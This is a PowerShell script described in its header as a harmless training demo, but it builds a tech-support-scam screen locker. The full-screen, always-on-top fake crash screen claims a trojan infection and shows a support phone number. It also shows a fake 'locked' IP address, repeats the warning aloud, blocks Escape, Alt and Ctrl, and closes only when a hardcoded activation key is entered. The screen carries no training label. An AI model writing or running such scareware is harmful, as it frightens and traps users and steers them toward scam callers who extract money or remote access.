function Show-BSODDemo {
<#
.SYNOPSIS

Shows a clearly labelled, non-destructive fake BSOD training screen.

.DESCRIPTION

Displays a full-screen mock Windows Blue Screen of Death.
It never crashes the machine and cannot be dismissed with Escape.

.EXAMPLE

PS> . .\run.ps1
PS> Show-BSODDemo

#>
	Add-Type -AssemblyName System.Windows.Forms
	Add-Type -AssemblyName System.Drawing
	Add-Type -AssemblyName System.Speech -ErrorAction SilentlyContinue

	$form = New-Object System.Windows.Forms.Form
	$form.Text = 'BSOD Simulation'
	$form.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
	$form.ForeColor = [System.Drawing.Color]::White
	$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
	$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
	$form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual
	$form.Bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
	$form.TopMost = $true
	$form.KeyPreview = $true
	$form.ShowInTaskbar = $false
	$form.ControlBox = $false
	$form.MinimizeBox = $false
	$form.MaximizeBox = $false
	$form.Cursor = [System.Windows.Forms.Cursors]::Default
	$form.Location = New-Object System.Drawing.Point(0, 0)
	$form.Size = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size
	$form.MinimumSize = $form.Size
	$form.MaximumSize = $form.Size
	$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
	$form.ShowIcon = $false
	$form.Opacity = 1.0
	$form.TopMost = $true
	$form.Activate()

	$mainText = "Your PC has been infected with a trojan virus and if you try to restart it can lead to`r`ncorruption of data just call the windows support below."

	$mainMessage = New-Object System.Windows.Forms.Label
	$mainMessage.AutoSize = $false
	$mainMessage.Width = 1700
	$mainMessage.Height = 170
	$mainMessage.Font = New-Object System.Drawing.Font('Consolas', 29, [System.Drawing.FontStyle]::Regular)
	$mainMessage.Location = New-Object System.Drawing.Point(35, 20)
	$mainMessage.Text = $mainText
	$mainMessage.ForeColor = [System.Drawing.Color]::White
	$mainMessage.BackColor = $form.BackColor
	$mainMessage.Padding = New-Object System.Windows.Forms.Padding(0)
	$form.Controls.Add($mainMessage)

	$progressLabel = New-Object System.Windows.Forms.Label
	$progressLabel.Text = '0% complete'
	$progressLabel.Font = New-Object System.Drawing.Font('Consolas', 18)
	$progressLabel.ForeColor = [System.Drawing.Color]::White
	$progressLabel.AutoSize = $true
	$progressLabel.Location = New-Object System.Drawing.Point(40, 190)
	$form.Controls.Add($progressLabel)

	$divider = New-Object System.Windows.Forms.Label
	$divider.Width = 2
	$divider.Height = 290
	$divider.BackColor = [System.Drawing.Color]::FromArgb(208, 233, 255)
	$divider.Location = New-Object System.Drawing.Point(420, 170)
	$form.Controls.Add($divider)

	$help = New-Object System.Windows.Forms.Label
	$help.Text = "Need immediate help?`r`nCall Technical Support:"
	$help.Font = New-Object System.Drawing.Font('Consolas', 26)
	$help.ForeColor = [System.Drawing.Color]::White
	$help.AutoSize = $true
	$help.Location = New-Object System.Drawing.Point(40, 280)
	$form.Controls.Add($help)

	$phone = New-Object System.Windows.Forms.Label
	$phone.Text = '+1 202-683-0876'
	$phone.Font = New-Object System.Drawing.Font('Consolas', 30, [System.Drawing.FontStyle]::Bold)
	$phone.ForeColor = [System.Drawing.Color]::FromArgb(255, 216, 70)
	$phone.AutoSize = $true
	$phone.Location = New-Object System.Drawing.Point(40, 395)
	$form.Controls.Add($phone)

	$customerIp = New-Object System.Windows.Forms.Label
	$customerIp.Text = "Your IP address is locked: $(([System.Net.IPAddress]::Parse('192.0.2.1').GetAddressBytes() | ForEach-Object { $_ + (Get-Random -Maximum 255) }) -join '.')"
	$customerIp.Font = New-Object System.Drawing.Font('Consolas', 20)
	$customerIp.ForeColor = [System.Drawing.Color]::White
	$customerIp.AutoSize = $true
	$customerIp.Location = New-Object System.Drawing.Point(40, 455)
	$form.Controls.Add($customerIp)

	$availability = New-Object System.Windows.Forms.Label
	$availability.Text = 'Available 24/7 for emergency assistance'
	$availability.Font = New-Object System.Drawing.Font('Consolas', 21)
	$availability.ForeColor = [System.Drawing.Color]::White
	$availability.AutoSize = $true
	$availability.Location = New-Object System.Drawing.Point(40, 500)
	$form.Controls.Add($availability)

	$playBtn = New-Object System.Windows.Forms.Button
	$playBtn.Size = New-Object System.Drawing.Size(160, 160)
	$playBtn.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
	$playBtn.FlatAppearance.BorderSize = 0
	$playBtn.BackColor = [System.Drawing.Color]::FromArgb(40, 98, 170)
	$playBtn.ForeColor = [System.Drawing.Color]::White
	$playBtn.Font = New-Object System.Drawing.Font('Segoe UI Symbol', 38)
	$playBtn.Text = '◉'
	$playBtn.Location = New-Object System.Drawing.Point(470, 200)
	$playBtn.Cursor = [System.Windows.Forms.Cursors]::Hand
	$playBtn.Add_Click({
		if ($script:tts -ne $null) {
			$script:tts.SpeakAsyncCancelAll()
			$script:tts.SpeakAsync($mainText)
		}
	})
	$form.Controls.Add($playBtn)

	$browserHost = New-Object System.Windows.Forms.Panel
	$browserHost.Location = New-Object System.Drawing.Point(700, 220)
	$browserHost.Size = New-Object System.Drawing.Size(570, 290)
	$browserHost.BackColor = [System.Drawing.Color]::FromArgb(238, 238, 238)
	$browserHost.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
	$browserHost.ForeColor = [System.Drawing.Color]::Black
	$browserHost.Visible = $false
	$form.Controls.Add($browserHost)

	$browser = New-Object System.Windows.Forms.WebBrowser
	$browser.Dock = [System.Windows.Forms.DockStyle]::Fill
	$browser.ScriptErrorsSuppressed = $true
	$browser.Navigate('https://example.com')
	$browserHost.Controls.Add($browser)

	$browserTimer = New-Object System.Windows.Forms.Timer
	$browserTimer.Interval = 300000
	$browserTimer.Add_Tick({
		$browserHost.Visible = $true
		$browserHost.BringToFront()
		$browserTimer.Stop()
	})
	$browserTimer.Start()

	$popup = New-Object System.Windows.Forms.Panel
	$popup.Location = New-Object System.Drawing.Point(700, 220)
	$popup.Size = New-Object System.Drawing.Size(570, 290)
	$popup.BackColor = [System.Drawing.Color]::FromArgb(238, 238, 238)
	$popup.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
	$popup.ForeColor = [System.Drawing.Color]::Black
	$popup.Visible = $true
	$popup.BringToFront()
	$form.Controls.Add($popup)

	$popupTitle = New-Object System.Windows.Forms.Label
	$popupTitle.Text = 'System Activation Required'
	$popupTitle.Font = New-Object System.Drawing.Font('Segoe UI', 18)
	$popupTitle.ForeColor = [System.Drawing.Color]::Black
	$popupTitle.AutoSize = $true
	$popupTitle.Location = New-Object System.Drawing.Point(25, 20)
	$popup.Controls.Add($popupTitle)

	$popupText = New-Object System.Windows.Forms.Label
	$popupText.Text = 'Enter activation key to exit system recovery mode:'
	$popupText.Font = New-Object System.Drawing.Font('Segoe UI', 14)
	$popupText.ForeColor = [System.Drawing.Color]::FromArgb(36, 36, 36)
	$popupText.AutoSize = $true
	$popupText.Location = New-Object System.Drawing.Point(25, 70)
	$popup.Controls.Add($popupText)

	$validActivationCode = 'KJH4Y-8GTRD-2M7QX-9PLW3-4STN8'
	$validActivationCodeNormalized = ($validActivationCode -replace '[^A-Za-z0-9]', '').ToUpperInvariant()
	$errorLabel = New-Object System.Windows.Forms.Label
	$errorLabel.Text = ''
	$errorLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 0, 0)
	$errorLabel.Font = New-Object System.Drawing.Font('Segoe UI', 11, [System.Drawing.FontStyle]::Bold)
	$errorLabel.AutoSize = $true
	$errorLabel.Location = New-Object System.Drawing.Point(25, 150)
	$errorLabel.Visible = $false
	$popup.Controls.Add($errorLabel)

	$keyInput = New-Object System.Windows.Forms.TextBox
	$keyInput.Width = 455
	$keyInput.Height = 38
	$keyInput.Font = New-Object System.Drawing.Font('Segoe UI', 15)
	$keyInput.Location = New-Object System.Drawing.Point(25, 110)
	$keyInput.BackColor = [System.Drawing.Color]::White
	$keyInput.ForeColor = [System.Drawing.Color]::Black
	$keyInput.MaxLength = 29
	$keyInput.CharacterCasing = [System.Windows.Forms.CharacterCasing]::Upper
	$keyInput.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
	$keyInput.Add_TextChanged({
		$raw = ($keyInput.Text -replace '[^A-Za-z0-9]', '').ToUpperInvariant()
		$parts = @()
		for ($i = 0; $i -lt $raw.Length; $i += 5) {
			$parts += $raw.Substring($i, [Math]::Min(5, $raw.Length - $i))
		}
		$formatted = ($parts -join '-')
		if ($keyInput.Text -ne $formatted) {
			$keyInput.Text = $formatted
			$keyInput.SelectionStart = $keyInput.Text.Length
		}
	})
	$keyInput.Add_KeyDown({
		if ($_.KeyCode -eq [System.Windows.Forms.Keys]::Enter) {
			$entered = ($keyInput.Text -replace '[^A-Za-z0-9]', '').ToUpperInvariant()
			if ($entered -eq $validActivationCodeNormalized) {
				$popup.Visible = $false
				$errorLabel.Visible = $false
				$form.Close()
			} else {
				$errorLabel.Text = 'Invalid activation code. Please try again.'
				$errorLabel.Visible = $true
				$keyInput.Focus()
				$keyInput.SelectAll()
			}
		}
	})
	$popup.Controls.Add($keyInput)

	$validateActivation = {
		$entered = ($keyInput.Text -replace '[^A-Za-z0-9]', '').ToUpperInvariant()
		if ($entered -eq $validActivationCodeNormalized) {
			$popup.Visible = $false
			$errorLabel.Visible = $false
			$form.Close()
		} else {
			$errorLabel.Text = 'Invalid activation code. Please try again.'
			$errorLabel.Visible = $true
			$keyInput.Focus()
			$keyInput.SelectAll()
		}
	}

	$okBtn = New-Object System.Windows.Forms.Button
	$okBtn.Text = 'OK'
	$okBtn.Width = 100
	$okBtn.Height = 38
	$okBtn.Font = New-Object System.Drawing.Font('Segoe UI', 14)
	$okBtn.Location = New-Object System.Drawing.Point(235, 235)
	$okBtn.BackColor = [System.Drawing.Color]::FromArgb(245, 245, 245)
	$okBtn.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard
	$okBtn.Add_Click($validateActivation)
	$popup.Controls.Add($okBtn)

	$cancelBtn = New-Object System.Windows.Forms.Button
	$cancelBtn.Text = 'Cancel'
	$cancelBtn.Width = 100
	$cancelBtn.Height = 38
	$cancelBtn.Font = New-Object System.Drawing.Font('Segoe UI', 14)
	$cancelBtn.Location = New-Object System.Drawing.Point(350, 235)
	$cancelBtn.BackColor = [System.Drawing.Color]::FromArgb(245, 245, 245)
	$cancelBtn.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard
	$cancelBtn.Add_Click({
		$keyInput.Text = ''
		$errorLabel.Visible = $false
		$keyInput.Focus()
	})
	$popup.Controls.Add($cancelBtn)

	$bottomText = New-Object System.Windows.Forms.Label
	$bottomText.Text = "If you'd like to know more, you can search online later for this error: SYSTEM_SERVICE_EXCEPTION"
	$bottomText.Font = New-Object System.Drawing.Font('Consolas', 22)
	$bottomText.ForeColor = [System.Drawing.Color]::White
	$bottomText.AutoSize = $false
	$bottomText.Width = 1800
	$bottomText.Height = 50
	$bottomText.Location = New-Object System.Drawing.Point(35, 725)
	$form.Controls.Add($bottomText)

	$script:tts = $null
	$script:ttsEnabled = $false
	try {
		$script:tts = New-Object System.Speech.Synthesis.SpeechSynthesizer
		$script:tts.Volume = 100
		$script:tts.Rate = 0
		$script:ttsEnabled = $true
		$script:tts.SpeakCompleted += {
			if ($script:ttsEnabled -and $script:tts -ne $null) {
				$script:tts.SpeakAsync($mainText)
			}
		}
		$script:tts.SpeakAsync($mainText) | Out-Null
	} catch {
		$script:tts = $null
		$script:ttsEnabled = $false
	}

	$form.Add_KeyDown({
		if ($_.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {
			$_.SuppressKeyPress = $true
		}
		if ($_.Alt -or $_.Control) {
			$_.SuppressKeyPress = $true
		}
	})

	$form.Add_Activated({
		$form.Location = New-Object System.Drawing.Point(0, 0)
		$form.Size = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size
		$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
	})

	$form.Add_Shown({
		$popup.Visible = $true
		$popup.BringToFront()
		if ($keyInput -ne $null) {
			$keyInput.Focus()
		}
	})

	$form.Add_FormClosing({
		if ($script:tts -ne $null) {
			$script:ttsEnabled = $false
			$script:tts.Dispose()
			$script:tts = $null
		}
	})

	[void]$form.ShowDialog()

	if ($script:tts -ne $null) {
		$script:ttsEnabled = $false
		$script:tts.Dispose()
		$script:tts = $null
	}
}

if ($MyInvocation.InvocationName -ne '.') {
	Show-BSODDemo
}
